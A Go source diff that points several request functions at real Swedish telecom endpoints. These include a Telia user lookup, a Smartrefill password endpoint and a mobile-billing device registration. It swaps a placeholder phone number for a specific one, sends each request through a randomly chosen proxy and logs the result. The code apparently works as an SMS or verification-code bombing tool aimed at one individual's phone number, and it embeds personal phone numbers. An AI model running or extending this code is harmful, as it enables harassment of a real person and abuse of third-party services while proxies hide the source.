@@ -6,6 +6,7 @@ import (
 	"log"
 	"math/rand"
 	"net/http"
+	"os"
 	"strconv"
 	"strings"
 	"time"
@@ -13,6 +14,8 @@ import (
 	"github.com/gookit/color"
 	"github.com/valyala/fasthttp"
 )
+
+var host, err = os.Hostname()
 
 func main() {
 
@@ -51,11 +54,11 @@ func StartALL() {
 }
 func Telia1() {
 
-	url := "http://37.187.56.77" // Replace with your API endpoint
+	url := "https://sa.telia.se/se/rs/users/msisdn" // Replace with your API endpoint
 
 	proxy := proxyList[rand.Intn(len(proxyList))]
 
-	data := `{"identifier": "46706505038"}` // Fixed the JSON formatting issue
+	data := `{"identifier": "46726415603"}` // Fixed the JSON formatting issue
 
 	req := fasthttp.AcquireRequest()
 	resp := fasthttp.AcquireResponse()
@@ -82,16 +85,17 @@ func Telia1() {
 
 	err := fasthttp.Do(req, resp)
 	if err != nil {
+		color.Println("[<fg=blue>"+host+"</>] - [<fg=red>"+url+"</>] - [<fg=red>"+strconv.Itoa(resp.StatusCode())+"</>] ::", proxy)
 
 	} else {
-		color.Println("[<fg=red>" + url + "</>] - [<fg=green>" + strconv.Itoa(resp.StatusCode()) + "</>] :: " + proxy)
+		color.Println("[<fg=blue>"+host+"</>] - [<fg=red>"+url+"</>] - [<fg=green>"+strconv.Itoa(resp.StatusCode())+"</>] ::", proxy)
 
 	}
 
 }
 func Laddkod() {
 
-	url := "http://37.187.56.77" // Replace with your API endpoint
+	url := "https://teliase.smartrefill.se/Refill/api/TELIA/v1/passwords/0726415603" // Replace with your API endpoint
 
 	proxy := proxyList[rand.Intn(len(proxyList))]
 
@@ -119,19 +123,21 @@ func Laddkod() {
 
 	err := fasthttp.Do(req, resp)
 	if err != nil {
+		color.Println("[<fg=blue>"+host+"</>] - [<fg=red>"+url+"</>] - [<fg=red>"+strconv.Itoa(resp.StatusCode())+"</>] ::", proxy)
 
 	} else {
-		color.Println("[<fg=red>" + url + "</>] - [<fg=green>" + strconv.Itoa(resp.StatusCode()) + "</>] :: " + proxy)
+		color.Println("[<fg=blue>"+host+"</>] - [<fg=red>"+url+"</>] - [<fg=green>"+strconv.Itoa(resp.StatusCode())+"</>] ::", proxy)
 
 	}
+
 }
 func ProdMobil2() {
 
-	url := "http://37.187.56.77" // Replace with your API endpoint
+	url := "https://prod2.mobill.se/mspRequest" // Replace with your API endpoint
 
 	proxy := proxyList[rand.Intn(len(proxyList))]
 
-	data := `{"hash":"Mqu2VBd7S9Tf3lQ74PogIytnuiw="," fasthttpId":"4a458cd7-b311-4676-b479-00f3ec583a93","messageService":"APP","messageType":"REGISTER_DEVICE_REQUEST","message":"{\"msisdn\":\"46706505038\",\"deviceId\":\"9f065f6d979246ed81c63cfe4fbaef39\",\"companyCode\":\"MP\",\"requestId\":null,\"deviceKey\":null,\"userId\":null,\"platform\":\"iOS\",\"osVersion\":\"16.2.0\",\"appVersionNumber\":\"1.4.33\",\"appBuildNumber\":\"2023.10.09.1\"}","requestId":null,"synchronous":true}` // Fixed the JSON formatting issue
+	data := `{"hash":"Mqu2VBd7S9Tf3lQ74PogIytnuiw="," fasthttpId":"4a458cd7-b311-4676-b479-00f3ec583a93","messageService":"APP","messageType":"REGISTER_DEVICE_REQUEST","message":"{\"msisdn\":\"46726415603\",\"deviceId\":\"9f065f6d979246ed81c63cfe4fbaef39\",\"companyCode\":\"MP\",\"requestId\":null,\"deviceKey\":null,\"userId\":null,\"platform\":\"iOS\",\"osVersion\":\"16.2.0\",\"appVersionNumber\":\"1.4.33\",\"appBuildNumber\":\"2023.10.09.1\"}","requestId":null,"synchronous":true}` // Fixed the JSON formatting issue
 
 	req := fasthttp.AcquireRequest()
 	resp := fasthttp.AcquireResponse()
@@ -158,9 +164,11 @@ func ProdMobil2() {
 	req.SetBodyString(data)
 	err := fasthttp.Do(req, resp)
 	if err != nil {
+		color.Println("[<fg=blue>"+host+"</>] - [<fg=red>"+url+"</>] - [<fg=red>"+strconv.Itoa(resp.StatusCode())+"</>] ::", proxy)
 
 	} else {
-		color.Println("[<fg=red>" + url + "</>] - [<fg=green>" + strconv.Itoa(resp.StatusCode()) + "</>] :: " + proxy)
+		
+		color.Println("[<fg=blue>"+host+"</>] - [<fg=red>"+url+"</>] - [<fg=green>"+strconv.Itoa(resp.StatusCode())+"</>] ::", proxy)
 
 	}
 
